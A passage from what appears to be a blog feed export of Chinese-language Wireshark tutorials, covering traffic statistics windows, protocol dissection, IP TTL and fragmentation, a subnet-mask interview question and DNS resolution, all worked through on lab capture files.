<p>分析上图可知，这个下载过程的往返时间图中的时间点大多在0.05秒以下，有一些较慢的点位于0.10~0.25秒之间。可以发现少量的值是超出了可以接受的范围，但是大多数的往返时间还是可以的，因此对于这个下载过程来说，整体是可以被接受的。  </p>
<p>##Flow Graph<br>数据流图功能可以将连接可视化，并且将一段时间中的数据流显示出来。数据流图一般以列的方式将主机之间的连接显示出来，并将数据组织到一起，便于更加直观地解读。</p>
<p>这里我们打开Lab3-3.pcap这个实验文件，选择菜单栏的“Statistics”-&gt;“Flow Graph”，就可以打开数据流图窗口：<br><img src="/2017/03/28/wireshark的图形显示/7.jpg" alt="7"><br>从上图中我们可以更好地看到整个连接的情况，比如TCP的三次握手，数据传输以及HTTP协议等的信息都一目了然。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 基础篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[wireshark的实用表格实验操作]]></title>
        <url>https://517736522.github.io/2017/03/28/wireshark%E7%9A%84%E5%AE%9E%E7%94%A8%E8%A1%A8%E6%A0%BC%E5%AE%9E%E9%AA%8C%E6%93%8D%E4%BD%9C/</url>
        <content type="html"><![CDATA[<p>##统计网络端点信息<br>通过上次课程的学习，我们已经掌握了关于Wireshark的基础知识，那么接下来我 们就有必要来研究一下这款软件强大的表格功能了。</p>
<p>这里首先讲解一下关于网络中的端点以及会话的知识。在网络中，如果想让通信得 到正常的执行，那么就必须至少拥有两台设备或者说端点（EndPoint）进行数 据的交互操作。所谓的端点，就是指网络上用于发送或者接收数据的设备。比如在 基于TCP/IP协议的通信中，就包含有两个端点：发送方和接收方的IP地址， 结合着实验文件（Lab2-1）可以发现，对于捕获的第1个数据包来说，发送方的IP 地址是180.97.34.134，而接收方的IP地址是192.168.0.14。那么这两个IP地址其 实就是两个端点：<br><img src="/2017/03/28/wireshark的实用表格实验操作/1.jpg" alt="1"><br>而在数据链路层，通信则是基于两台主机中安装的网卡和它们的MAC地址进行 的。依旧分析一下第1个数据包，我们在Packet Details面板中展开Ethernet II ，可以看到发送方的地址是94:de:80:d4:be:c9，而接收方的地址是 d0:fa:1d:61:0b:0c。那么这两个地址就是通信中的端点：<br><img src="/2017/03/28/wireshark的实用表格实验操作/2.jpg" alt="2"><br>我们在实际分析过程中，面对网络流量的时候，可以将问题定位到网络中的一个特 定的端点上。可以在菜单栏中选择“Statistics”-&gt;“Endpoints”来打 开Endpoints窗口：<br><img src="/2017/03/28/wireshark的实用表格实验操作/3.jpg" alt="3"><br>可以看到，这个窗口给出了端点中的非常多的有用的数据。在其顶部的选项卡中， 显示了当前捕获文件中所有被支持和识别的端点，每个选项卡都表示不同的协议 。灰色的选项卡表示不存在该协议的统计信息。以Ethernet选项卡为例，每列 所表示的信息为：  </p>
<pre><code>Address：端点的地址
Packets：在捕获文件中包含该地址的数据包数量。
Bytes：数据包的字节数据。
Tx Packets：发送的数据包数量。
Tx Bytes：发送的数据包的字节数。
Rx Packets：接收的数据包数量。
Rx Bytes：接收的字节数
</code></pre><p>在这个窗口中还包含有名为“Name resolution”的多选框，它可以在端点窗 口中打开名字解析的功能。上图是包含有名字解析的，下图则是取消名字解析的情 况：<br><img src="/2017/03/28/wireshark的实用表格实验操作/4.jpg" alt="4">  </p>
<p>##查看网络会话信息<br>所谓的网络会话（Conversation）可以理解为两个人之间的谈话，只不过网络 会话描述的是两台主机（端点）之间进行的通信活动。对于TCP协议来说，最常 见的会话就是连接建立时的三次握手了。可以在菜单栏中选择“Statistics ”-&gt;“Conversations”来打开Conversations窗口：<br><img src="/2017/03/28/wireshark的实用表格实验操作/5.jpg" alt="5"><br>与Endpoints窗口相同，Conversations窗口中所列出的会话同样以不同的协议分</p>
<p>布在不同的选项卡中，这可以通过顶部的选项卡进行切换。如果我们右键单击一个</p>
<p>会话，选择“Apply as Filter”-&gt;“Selected”就可以创建一些非常</p>
<p>实用的筛选器，比如显示由设备A发出的所有数据，设备B收到的所有数据，或者设</p>
<p>备A和B之间的所有通信数据等。而一旦我们选择了其中的某一项筛选条件，那么回</p>
<p>到Wireshark主界面时，在筛选条件输入框中，自动就会添加上刚才选择的条件：<br><img src="/2017/03/28/wireshark的实用表格实验操作/6.jpg" alt="6">  </p>
<p>##使用端点和会话窗口分析网络问题<br>在排解网络问题的过程中，端点和会话窗口往往扮演着非常重要的角色。当我</p>
<p>们试图寻找网络中大规模流量的源头，或者查找哪台服务器最为活跃上面，这两个</p>
<p>窗口往往就能告诉我们一切。这里我们打开Lab2-2.pcap这个实验文件，利用筛选</p>
<p>器只保留http协议的数据包。可以发现，有多个客户端在浏览互联网时产生了大</p>
<p>量的http流量。那么现在我们可以使用端点窗口来查看一下具体的情况：<br><img src="/2017/03/28/wireshark的实用表格实验操作/7.jpg" alt="7"><br>这里我们查看IPv4选项卡，并且以字节数从高到低进行排序。可以看到流量最大的</p>
<p>是172.16.16.128这个地址，其实也就是本机地址，说明网络中的这个设备是数</p>
<p>据集中最活跃的信息源，也就是进行了最多通信的主机。第二个地址是</p>
<p>74.125.103.163，并不是本地地址，那么就可以假设本地某一个或者多个客户端</p>
<p>与这个地址进行了一些交互。利用ip.cn网站查询这个IP地址的信息如下：<br><img src="/2017/03/28/wireshark的实用表格实验操作/8.jpg" alt="8">  </p>
<p>可以发现，这个IP地址属于美国的谷歌公司。</p>
<p>或者我们也可以使用GeoLiteCity.dat来辅助我们进行分析。首先将实验文件中</p>
<p>的maxmind目录拷贝到C盘的根目录下，然后在Wireshark中选择菜单栏</p>
<p>的“Edit”-&gt;“Preferences”-&gt;“Name Resolution”。在新打开</p>
<p>的界面中选择“GeoIP Database Directories”后面的Edit按钮，单击</p>
<p>New，选择maxmind目录，再OK。之后重启Wireshark，那么当我们</p>
<p>再次载入Lab2-2.pcap，打开端点窗口，再选择IPv4选项卡，就会发现这里添加了</p>
<p>City、Latitude以及Longitude这几列的信息：<br><img src="/2017/03/28/wireshark的实用表格实验操作/9.jpg" alt="9"><br>此时再单击Map按钮，就可以将所有数据包定位在一张地图上，点击地图上的</p>
<p>圆点，还可以显示相应的信息：  </p>
<p><img src="/2017/03/28/wireshark的实用表格实验操作/10.jpg" alt="10"><br>下面我们来分析一下会话窗口。这里有一个问题，最活跃的通信端点一定包含有流</p>
<p>量最大的会话吗？不妨验证一下，这里打开会话窗口，选择IPv4选项卡，再用字节</p>
<p>数对列表进行排序：<br><img src="/2017/03/28/wireshark的实用表格实验操作/11.jpg" alt="11"><br>在这里可以看到，74.125.103.163这个IP地址发出的数据包要比</p>
<p>172.16.16.128这个地址发出的数据包大得多。说明最活跃的通信端点并不一定包</p>
<p>含有流量最大的会话。我们以后在实际的分析中，还会用到这两个窗口。  </p>
<p>##协议的分层统计<br>当我们在分析一个很大的捕获文件时，我们往往想要知道文件中协议的分布情况</p>
<p>，或者想要获取协议的多层结构信息。为了达到这个目的，我们可以使用</p>
<p>Wireshark的“协议分层统计”功能，它是对网络进行基准分析的强有力的工具</p>
<p>。举个例子来说，假设我们网络中的ARP流量通常占百分之十，但是某一天经过抓</p>
<p>包分析发现ARP的流量增长到了百分之五十，那么就可以知道一定是某个地方出了</p>
<p>问题。</p>
<p>这里我们依旧研究Lab2-2.pcap这个实验文件，在菜单栏中选择“Statistics</p>
<p>”-&gt;“Protocol Hierarchy”，打开协议分层统计窗口：<br><img src="/2017/03/28/wireshark的实用表格实验操作/12.jpg" alt="12"><br>这个对话框显示了捕获的文件中所包含的所有协议的树状分支。其中的每一行都</p>
<p>包含一个协议层次的统计值，每列的含义如下：</p>
<pre><code>Protocol：协议的名称
%Packets：含有该协议的数据包的数量在捕获文件的所有数据包中所占的 比例
Packets：含有该协议的数据包的数量
%Bytes：含有该协议的字节数目在捕获文件的所有字节数目中所占的比例
Bytes：含有该协议的字节数
MBits/s：协议的带宽（相对于捕获时间）
</code></pre><p>如果大家在学习的过程中想要获取更为详细的说明，也可以点击左下角 的“Help”按钮，从而打开帮助文档。</p>
<p>其实协议分层统计窗口是我们在进行网络流量检查时最先打开的窗口之一，因为 它能够提供给我们一个网络中活动类型的直观快照。通过查看这个窗口，检查正在 使用的协议分布情况，从而获取网络中用户和设备的情况。往往只需要简单地查看 网段中的流量，就可以立刻分辨这个网段属于哪个部门。比如IT部门网段的流量中 通常有管理协议，例如Internet控制报文协议（ICMP）或者简单网络管理协议 （SNMP），而订单管理部门通常有大量的简单邮件传输协议（SMTP）的流量。 甚至我们还可以在特定的网段中找到玩网络游戏或者看网络视频的流量信息。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 基础篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[wireshark的高级特性]]></title>
        <url>https://517736522.github.io/2017/03/28/wireshark%E7%9A%84%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7/</url>
        <content type="html"><![CDATA[<p>##协议解析<br>可以说，Wireshark最为强大的功能之一就是协议解析功能，也是我们最为常用的功能。尽管我们往往不会注意这个功能，但是它却一直实实在在地影响着我们的分析过程。协议的解析是由Wireshark的协议解析器完成的，它可以将网络上获取的原始二进制数据包进行拆分，变成相关协议的不同区段，以便于我们的分析。比如我们之前接触过多次的TCP协议，一旦Wireshark捕获到该协议的数据包，就会自动分析，并且以TCP数据包的格式显示出来，告诉我们每一个数据段的意义。</p>
<p>我们可以将Wireshark的协议解析器看作是网络原始数据流和Wireshark软件之间的翻译器。如果想要让Wireshark支持某个协议，那么它就必须拥有该协议的解析器。当然如果我们在实际的分析过程中遇到了新的协议，也可以使用C语言或者Python来自己编写一个解析程序。</p>
<p>但是这里需要注意的是，Wireshark在进行协议解析的时候并不见得每次都会选择出正确的解析器，尤其是当网络上的一个协议使用了不同于标准的配置时，往往会出现错误的协议解析。一旦遇到这种情况，我们就需要更改Wireshark的协议解析方式。比如我们这里可以分析一下Lab4-1.pcap这个实验文件：<br><img src="/2017/03/28/wireshark的高级特性/1.jpg" alt="1"><br>可以发现，这个捕获文件中出现了大量的SSL通信。SSL指的是Secure Socket Layer protocol，也就是安全的套接层协议，常用于主机之间的安全加密传输。因为SSL是用于保密传输的，因此一般来说，我们在Wireshark中查看SSL的数据包并不会发现有用的信息。这里我们首先看一下第四个数据包，重点查看一下Packet Bytes面板：<br><img src="/2017/03/28/wireshark的高级特性/2.jpg" alt="2"><br>可以发现这里出现了明文数据流量，比如“FileZilla Server”，其实这是一个FTP的服务程序。而查看第八和第九个数据包，又可以发现诸如“USER admin”以及“Password”这样的用户名和密码。如果这真的是SSL数据包，那么我们就不会读取到包中的任何有用的数据，更不会看到以明文形式传输的用户名和密码。依据这些信息，我们就可以知道，这应该是FTP数据包，而并非SSL数据包。而导致Wireshark解析错误的原因很可能就是因为这个FTP协议使用了443号端口，而这个端口原本应当是HTTPS（基于SSL的HTTP）使用的。</p>
<p>为了解决这个问题，我们需要强制Wireshark使用FTP协议解析器来解析这些数据包。我们可以用鼠标右键单击需要转换的数据包（比如第八个数据包），选择“Decode As”，就会弹出一个新的对话框：<br><img src="/2017/03/28/wireshark的高级特性/3.jpg" alt="3"><br>在下拉列表中选择“destination-&gt;443”，并在右边列表中选择FTP，也就是让Wireshark使用FTP协议的解析器对所有端口号为443的数据流量进行解析。当我们单击OK后，那么相应的SSL流量就都转化成了FTP流量，这就有助于我们接下来的分析。但是这里所做出的更改，并不会保存下来，也就是说下次我们再打开这个捕获文件时，我们还需要重新进行解码设置。</p>
<p>我们可以对一个捕获文件做多次的解码操作，而且可以在“Decode As”对话框中点击“Show Current”按钮来查看我们的修改记录：<br><img src="/2017/03/28/wireshark的高级特性/4.jpg" alt="4"><br>由于Wireshark是一款开源的软件，因此我们可以分析该软件的源代码来找出协议解析错误的原因。在其官方网站上，我们就可以下载到软件的源码。比如对于协议解析，我们可以在其epan/dissectors文件夹中找到协议解析器程序。每一个解析器程序都以packet-protocolname.c，即“数据包-协议名称”的形式命名。这些文件都有良好的注释，如果大家想深入研究Wireshark的原理，建议大家可以仔细研究一下这些源代码，从而在未来的分析中，开发出自己想要的功能。  </p>
<p>##跟踪TCP Stream<br>TCP流量可以说是我们在日常的分析中遇到最多的数据包了。而Wireshark为了方便我们的分析，可以将TCP流重组成易于阅读的形式，而不是一小块一小块地查看。这里我们打开Lab4-2.pcap这个文件，然后用右键单击任意一个TCP或者HTTP数据包，并选择“Follow TCP Stream”，此时TCP流就会在一个新窗口中显示出来：<br><img src="/2017/03/28/wireshark的高级特性/5.jpg" alt="5"><br>在这里我们可以清晰地看到两台主机之间的绝大多数通信。可以发现，这里最初是对一个站点进行GET请求，之后该站点的服务器回复一个OK表示请求成功。每当客户端希望服务器给予响应的时候，都会出现这样的数据模式。另外，在这个窗口中，我们还可以实现文本搜索、保存文件以及打印等功能。这可以大大节省分析的时间。  </p>
<p>##查看数据包的长度<br>在使用Wireshark进行实际的分析时，我们往往可以从一组或者一个数据包的大小中，获取很多的信息。一般来说，以太网上的帧的大小为1518个字节，除去以太网、IP以及TCP等的头部信息，还剩下1460个字节，这些字节可以供应用层协议来使用。知道了这些，我们就可以通过一个捕获文件中数据包长度的分布情况，来对流量进行分析。</p>
<p>这里我们打开Lab4-3.pcap文件，选择菜单栏上的“Statistics”-&gt;“Packet Lengths”，然后点击“Create Stat”，则可以打开如下窗口：<br><img src="/2017/03/28/wireshark的高级特性/6.jpg" alt="6"><br>这里我们需要重点关注的是1280~2559这个区段的数据包。类似于像这种比较大的数据包一般都是用于数据的传输，而较小的数据包则是用于保存协议的控制序列。在这里可以看到，1280~2559这个区段的数据包占据了66.43%的比重，是最多的。那么很明显这里包含有一个或多个的数据传输流量。这有可能是HTTP的下载、FTP的上传，或者其它类型的主机间的通讯等。而余下的占据第二位的是介于40~79这个范围的数据包，占有33.44%的比重。很明显，这部分的数据包所保存的正是TCP控制数据包。</p>
<p>事实上，查看数据包的长度是对捕获文件进行概览的好方法。如果发现了很多较大的数据包，那么极有可能是进行了数据的传输。如果绝大部分的数据包都很小，那么就可以认为这里面包含有很多的控制命令，而不存在大规模数据的传输情况。虽然很多时候，查看数据包的大小并不是一个必需的操作，但是在进行深入分析前对捕获文件的情况做一个概览，还是很有帮助的。  </p>
<p>##专家信息<br>整个网络中的TCP信息，都会被Wireshark的专家信息所记录，如丢包或者网络阻塞等。针对于每个协议的解析器，都会有一些专家信息，我们在分析的时候，可以通过专家信息窗口来查看使用该协议的数据包中一些特定状态的错误、警告以及提示等信息。</p>
<p>专家信息窗口可以通过菜单栏的“Analyze”-&gt;“Expert Info”来打开：<br><img src="/2017/03/28/wireshark的高级特性/7.jpg" alt="7"><br>这个界面中一共有6个选项卡，分别表示的是：</p>
<p>Error：数据包里面或者解析器解析时出现的错误。 Warnings：不正常通信中的异常数据包。 Notes：正常通信中的异常数据包。 Chats：网络通信的基本信息。 Details：显示数据包的详细信息。 Packet Comments：数据包的描述信息。</p>
<p>可以发现，当前的捕获文件中一共有3个警告，19个注意、3个对话以及25个细节信息。选项卡括号中的数字表示消息出现的次数，而括号外的数字表示该类别中不同消息的数量。</p>
<p>具体分析一下当前捕获的数据包，首先看一下Warnings。可以发现第一个是“Previous Segment Not Captured”，表示数据包丢失，当数据流中的一个期望的序列号被跳过时，这个警告就会出现。第二个是“out-of-order”，这个警告是当数据包没有按照顺序接收时出现。</p>
<p>然后看一下Notes选项卡。这里出现了许多“Duplicate ACK”，表示当一台主机没有收到下一个期望的序列号的数据包时，就会生成最近收到一次数据的重复ACK，表明新的数据包未收到。“retransmission”的出现，表示数据包出现了丢失的情况。发生在收到重复的ACK，或者数据包的重传输计时器超时的时候。</p>
<p>Chats选项卡中的内容则是与TCP握手以及HTTP的GET请求相关，我们会在以后的课程中详细分析。最后的Details选项卡的内容则是将前面几个选项卡的内容进行了整合。</p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 基础篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[wireshark眼中的IP协议]]></title>
        <url>https://517736522.github.io/2017/03/28/wireshark%E7%9C%BC%E4%B8%AD%E7%9A%84IP%E5%8D%8F%E8%AE%AE/</url>
        <content type="html"><![CDATA[<p>##存活时间与IP分片<br>这里我们首先来研究一下关于IP协议的两个非常重要的概念：存活时间与IP分片。存活时间（TTL，Time to Live）用于定义数据包的生存周期，也就是在该数据包被丢弃之前，所能够经历的时间，或者能够经过的最大路由数目。这个值是在数据包被创建的时候设置的，而且通常在每次发往一个路由器的时候会实现自减一的操作。一旦TTL的值变为了0，那么这个数据包就会被丢弃。由于TTL的值在技术上是基于时间的，那么一个非常繁忙的路由器可能会将TTL的值减去不止1，但是一般来说，我们还是可以认为一个路由设备在多数情况下只会将TTL的值减去1。这里我们结合实验文件Lab7-1.pcap来在Wireshark中分析一下存活时间：<br><img src="/2017/03/28/wireshark眼中的IP协议/1.jpg" alt="1"><br>这个捕获文件中包含有两个ICMP（Internet Control Message Protocol，Internet控制报文协议）数据包，它使用了IP协议进行数据包的传递，我们可以利用Packet Details面板来展开IP的头部信息进行分析。</p>
<p>在这里可以看到，IP的版本号为4，IP头的长度是20字节，总长度是60字节，并且TTL的值是128。其实这个捕获文件是从IP地址为10.10.0.3的设备将一个ICMP请求发往了IP地址为192.168.0.128的设备上。也就是使用了ping来测试设备之间的通信。而这个捕获文件就是在源主机上被创建的。</p>
<p>接下来我们看一下Lab7-2.pcap实验文件，它是在目标主机，也就是IP地址为192.168.0.128的设备上捕获的。这里我们只关注第一个数据包的IP头部信息：<br><img src="/2017/03/28/wireshark眼中的IP协议/2.jpg" alt="2"><br>可以发现，这里的TTL值变成了127，比原来的TTL少了1。就算我们不知道这个网络的结构，那么也可以由TTL值推断出这两台设备之间是有一个路由器的，正是由于有一个路由器，才使得TTL的值减少了1。</p>
<p>接下来我们研究一下IP分片。IP数据包的分片指的是将一个数据流分为更小的片段，是IP用于解决跨越不同类型的网络时可靠传输的一个特性。数据包的分片主要基于OSI模型第二层的数据链路层协议所使用的最大传输单元（MTU，Maximum Transmission Unit）的大小，以及使用这些第二层协议的设备配置情况。在多数情况下，第二层所使用的数据链路层协议是以太网。而以太网的默认MTU是1500，那么以太网的网络上所能传输的最大数据包的大小就是1500字节，注意这里面并不包括14字节大小的以太网头部本身。</p>
<p>当一个设备准备传输一个IP数据包时，会首先将这个数据包的大小和将要把这个数据包传出去的网络接口的MTU进行比较，从而确定是否需要将这个数据包分片。如果数据包的大小大于MTU，那么这个数据包就会被分片。步骤如下：</p>
<p>（1）设备将数据分为若干个可以成功进行传输的数据包。 （2）每个IP头的总长度域（Total Length）会被设置为每个分片的片段长度。 （3）更多分片标志（More fragments）将会在数据流的所有数据包中设置为1，最后一个数据包则为0。 （4）IP头中分片部分的分片偏移将会被设置。 （5）数据包被发送出去。</p>
<p>下面我们结合Lab7-3.pcap这个实验来进行分析。这个捕获文件同样是在发送ping请求时，在源主机上捕获的。首先查看一下数据包1的IP头部分：<br><img src="/2017/03/28/wireshark眼中的IP协议/3.jpg" alt="3">  </p>
<p>这里我们重点关注的是更多分片标志（More fragments）以及分片偏移（Fragment offset）。由于说在这个数据包中，更多分片标志被设置为了1，意味着这是一个分片数据包，并且接收设备还需要等待接收序列中的另一个数据包。而分片偏移被设置为了0，说明这个数据包是一系列分片偏移中的第一个。接下来查看一下第二个数据包的IP头：<br><img src="/2017/03/28/wireshark眼中的IP协议/4.jpg" alt="4"><br>这个数据包同样被设置了更多分片标志，而接下来的分片偏移的值是1480，这是因为前一个分片是1500字节，但是其中包含有20字节的IP头，因此到这里分片偏移就成了1480。再看一下第3个数据包：<br><img src="/2017/03/28/wireshark眼中的IP协议/5.jpg" alt="5"><br>这个数据包并没有设定更多分片标志位，说明这是整个数据流的最后一个分片。并且其分片偏移被设定为2960，也就是1480加上1480的结果。这三个分片之所以会被认为来自于同一个数据序列，是因为在Identification中，这三个数据包的值都是0x7474。  </p>
<p>##IP数据包的捕获<br>有很多方法可以捕获到IP数据包，比如我们打开一个网站，此时如果使用Wireshark就可以捕获到非常多的IP数据包。但是这样一来我们会捕获到非常多的诸如DNS、HTTP、TCP等协议的数据包，就不利于我们的分析。所以我们这里可以使用ping，这样就只会获取到ICMP协议的数据包。首先我们可以在想要进行捕获的系统（我这里使用的是虚拟机）上打开Wireshark，选择菜单栏的“Capture”-&gt;“Options”，进行相应的设置：<br><img src="/2017/03/28/wireshark眼中的IP协议/6.jpg" alt="6"><br>这里我将筛选器设置为IP，也就是只捕获IP流量信息，并且设置了文件的保存路径，之后点击Start开始进行捕获。此时我们在虚拟机上打开cmd，ping主机的IP地址，然后查看捕获结果：<br><img src="/2017/03/28/wireshark眼中的IP协议/7.jpg" alt="7"><br>那么我们此时已经捕获到了相应的IP数据包。但是需要说明的是，由于我所模拟的这两台主机之间并没有路由器，因此TTL的值并没有改变。</p>
<p>下面我们可以尝试捕获IP分片数据包，基本设置同上，只不过这次需要在ping上额外加上“-l 3000”，表示捕获的数据包的大小为3000，则捕获的数据包如下：<br><img src="/2017/03/28/wireshark眼中的IP协议/8.jpg" alt="8"><br>可见，这一系列的数据包是经过分片之后发送的。大家可以自行分析之后的数据包。</p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[一道有趣的网络工程师面试题]]></title>
        <url>https://517736522.github.io/2017/03/28/%E4%B8%80%E9%81%93%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
        <content type="html"><![CDATA[<p>##问题概述与基本分析<br>假设有A和B两台服务器，其中B的子网掩码本来应该是255.255.255.0，但是现在却被不小心配置成了255.255.255.224，那么A和B之间还可以正常通信吗？</p>
<p>既然这个问题主要与子网掩码有关，那么我们这里不妨先简单讲解一下IP地址与子网掩码的相关知识。 我们知道，IP地址是一个32位的地址，用来唯一标识连接到网络的设备。由于让人记住一串32位长的01字符确实比较困难，所以IP地址就采用了点分四组的表示方法。</p>
<p>在点分四组的表示方法中，以A.B.C.D的形式，构成IP地址的四组1和0分别转换为十进制的0到255之间的数。我们可以拿11000000 10101000 00000000 00000001这样的IP地址举例来说。这个值显然是不容易记住或者表示的。但是如果采用点分四组的表示方法，我们就可以将其表示为192.168.0.1。</p>
<p>IP地址之所以会被分成4个单独的部分，是因为每个IP地址都包含着两个部分：网络地址和主机地址。网络地址用来标识设备所连接到的网络，而主机地址则标识这个网络中的设备本身。用来决定究竟IP地址哪部分属于网络或者主机的划分通常并不唯一。这实际上是由另一组名为网络掩码（network mask）的地址信息所决定的，有时它也会被称为子网掩码（subnet mask）。 子网掩码用来标识IP地址中究竟哪一部分属于网络地址而哪一部分属于主机地址。子网掩码的长度也是32位，并且被设置为1的每一位都标识着IP地址的对应部分是属于网络地址的，而剩下设置为0的部分则标识为主机地址。</p>
<p>这里我们可以以IP地址为10.10.1.22为例，其二进制形式为00001010 00001010 00000001 00010110。为了能够区分出IP地址的每一部分，我们使用子网掩码。那么对于这个例子，我们假设其子网掩码为11111111 11111111 00000000 00000000。这就意味着IP地址的前一半（10.10或者00001010 00001010）是网络地址，而后一半（1.22或者00000001 00010110）标识着这个网络上的主机。</p>
<p>子网掩码也可以写成点分四组的形式。比如子网掩码11111111 11111111 00000000 00000000可以被写成255.255.0.0。 IP地址和子网掩码为了简便起见，通常会被写成无类型域间选路（Classless Inter-Domain Routing, CIDR）的形式。在这种形式下，一个完整的IP地址后面会有一个左斜杠（/），以及一个用来表示IP地址中网络部分位数的数字。举例来说，IP地址10.10.1.22和网络掩码255.255.0.0，在CIDR表示法下就会被写成10.10.1.22/16的形式。</p>
<p>好，那么基础知识就回顾到这里。但是即便我们再反复琢磨相关术语的定义，甚至看经典的教材进行研究，似乎也不知道这个面试问题的正确答案。因此，我们唯有通过Wireshark来进行抓包分析了。  </p>
<p>##数据包的捕获与分析<br>依据题意，我们可以准备两台计算机A和B，将B的子网掩码设置为一个错误的值，然后在该计算机上开启嗅探，并且ping计算机A的IP地址。正常来说是可以ping通的，并且Wireshark也捕获到了相关的数据包，也就是实验文件Lab22-1.cap：<br><img src="/2017/03/28/一道有趣的网络工程师面试题/1.jpg" alt="1"><br>首先1号数据包是计算机B通过ARP广播查询默认网关192.168.26.2的MAC地址。那么为什么我们ping的是计算机A的IP，但是B却去查询默认网关的MAC地址呢？这是因为B根据自己的子网掩码，计算出A和自己属于不同的子网。而跨子网通信是需要默认网关来进行转发的。而如果想要和默认网关进行通信，就需要获取它的MAC地址。</p>
<p>接下来的2号数据包则是默认网关192.168.26.2向B回复了自己的MAC地址。</p>
<p>3号数据包就是由B发出的ping数据包，制定目的IP地址为A，也就是192.168.26.129。但是目标MAC地址却是默认网关的00:50:56:e7:2f:88。这就表明B希望默认网关把数据包转发给A。至于默认网关是否真的执行了转发的操作，我们这里无从得知，除非在该网关上也进行抓包分析。 4号数据包说明B收到了A发出的ARP广播，这个广播查询的是B的MAC地址。这是因为在A看来，B属于相同的子网，同一个子网进行通信并不需要默认网关的参与，只要通过ARP获取对方的MAC地址就可以了。这个数据包也表明默认网关成功地把B发出的ping请求转发给A了，否则A不会无缘无故地就尝试与B进行通信。</p>
<p>在5号数据包中，B回复了A的ARP请求，把自己的MAC地址告诉了A。这也就说明了，B在执行ARP回复的时候并不会考虑子网的问题。虽然ARP请求来自于其它子网的IP，但是也会照样回复。</p>
<p>6号数据包是B收到了A的ping回复。从MAC地址00:0c:29:0c:22:10可以看出，这个数据包是直接由A发送来的，而不是通过默认网关转发的。</p>
<p>后面的7到10号数据包都是重复的ping请求和ping回复。因为A和B都已经知道了对方的联系方式，因此就没有必要再发ARP了。</p>
<p>分析至此可以知道，整个通信过程，首先B会把ping请求交给默认网关，然后默认网关再转发给A。而A收到请求之后，就直接把ping回复给B。那么这也就说明，在题目的要求配置下，A和B之间还是可以正常通信的。  </p>
<p>##小结<br>当我们遇到不确定的网络问题时，利用Wireshark进行分析以寻求答案是最好的选择，希望大家能够活学活用，体会Wireshark的强大。</p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[不可或缺的DNS协议]]></title>
        <url>https://517736522.github.io/2017/03/28/%E4%B8%8D%E5%8F%AF%E6%88%96%E7%BC%BA%E7%9A%84DNS%E5%8D%8F%E8%AE%AE/</url>
        <content type="html"><![CDATA[<p>##DNS解析的过程<br>DNS的服务采用服务器/客户端（C/S）的方式工作。当客户端程序要通过一个主机名称访问网络中的一台主机时，它首先需要得到这个主机名称所对应的IP地址。因为IP数据包中允许放置的是目标主机的IP地址，而不是主机的名称。可以从本机的hosts文件中得到主机名称所对应的IP地址，但如果hosts文件不能够解析该主机的名称，则只能通过向客户机所设定的DNS服务器进行查询了。不过本机的hosts文件可能会被造假，从而为黑客打开方便之门。对此有兴趣的朋友可以学习“i春秋”的《病毒木马查杀实战》系列的课程。下面以www.ichunqiu.com域名为例讲解DNS解析的过程：<br><img src="/2017/03/28/不可或缺的DNS协议/1.jpg" alt="1"><br>由上图可知DNS名称解析的过程为</p>
<p>1、客户计算机向本地域名服务器发送了一个查询请求，请求查询域名为www.ichunqiu.com的IP地址。</p>
<p>2、本地域名服务器查找自己保存的记录，看能否找到这个被请求的IP地址。如果本地域名服务器有这个地址，就会把这个地址返回给客户计算机。如果本地域名服务器没有这个地址，则会发起查找地址的过程。本地域名服务器发送请求给根域名服务器，询问www.ichunqiu.com的IP地址。</p>
<p>3、根域名服务器无法提供这个地址，但是会将com的名称服务器的地址返回给本地域名服务器。</p>
<p>4、本地域名服务器再向com域服务器发送查询地址的请求。</p>
<p>5、com域服务器无法提供这个地址，就将ichunqiu.com域名服务器的地址发送给本地域名服务器。</p>
<p>6、本地域名服务器再向ichunqiu.com域名服务器发送地址查询的请求。</p>
<p>7、ichunqiu.com域名服务器找到了www.ichunqiu.com的IP地址，就将这个地址发给本地域名服务器。</p>
<p>8、本地域名服务器会将这个地址发给客户计算机，并将这个IP地址保存到缓存中。那么接下来，客户计算机就可以访问www.ichunqiu.com了。</p>
<p>以上就是DNS域名解析的过程，在这个过程中通常会用到两种查询方式，分别是递归查询和迭代查询：<br>1、递归查询</p>
<p>客户计算机向本地域名服务器的查询一般采用的是递归查询。如果客户机所询问的本地域名服务器无法提供被查询域名的IP地址，那么本地域名服务器就会以DNS客户的身份，向其它根域名服务器继续发出查询请求的报文。<br>2、迭代查询</p>
<p>本地域名服务器向根域名服务器的查询通常采用的是迭代查询。当根域名服务器收到本地域名服务器的迭代查询请求的报文时，要么给出所要查询的IP地址，要么告诉本地域名服务器“下一步应该向哪个域名服务器进行查询”。然后本地域名服务器就进行后续的查询。<br>DNS查询数据包分析</p>
<p>这里我们结合Lab13-1.pcap文件来分析一下DNS的查询：<br><img src="/2017/03/28/不可或缺的DNS协议/2.jpg" alt="2"><br>首先看一下第一个数据包。它是由IP地址为192.168.0.114发往205.152.37.23的53号端口的。53号端口也正是系统默认的DNS查询的端口。并且我们还可以知道，DNS其实是基于UDP协议的。</p>
<p>这里我们看一下DNS头部的Flags区段。可以发现这个数据包是一个典型的DNS请求。再展开查询区段，从Name的值可以知道客户端其实是想查询wireshark.org的网络地址。接下来的Type:A表示域名类型为A，也就是主机地址。并且地址的类型是IN，也就是互联网地址。那么其实这个数据包就是在向本地域名服务器询问wireshark.org的IP地址是什么。下面看一下第二个数据包：  </p>
